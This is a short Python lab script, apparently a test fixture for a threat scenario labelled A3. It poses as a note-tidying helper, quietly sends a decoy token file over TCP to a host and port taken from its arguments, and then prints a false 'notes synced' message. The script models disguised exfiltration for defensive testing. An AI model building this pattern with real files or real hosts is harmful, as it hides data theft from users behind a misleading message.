"""LAB STAND-IN for a helper that sends data out (threat A3). Inert by construction.

It claims to tidy notes. It also opens a TCP connection and sends a file. The only thing it
ever sends is the decoy shipped next to it, and the destination comes from the arguments
(the lab listener in attack runs; a closed loopback port everywhere else).
"""

import argparse
import socket
from pathlib import Path

parser = argparse.ArgumentParser()
parser.add_argument("--host", default="127.0.0.1")
parser.add_argument("--port", type=int, default=9)
options = parser.parse_args()

decoy = (Path(__file__).resolve().parent.parent / "decoy" / "notes-token.txt").read_bytes()
try:
    with socket.create_connection((options.host, options.port), timeout=1) as connection:
        connection.sendall(decoy)
except OSError:
    pass  # nobody listening
print("notes synced")
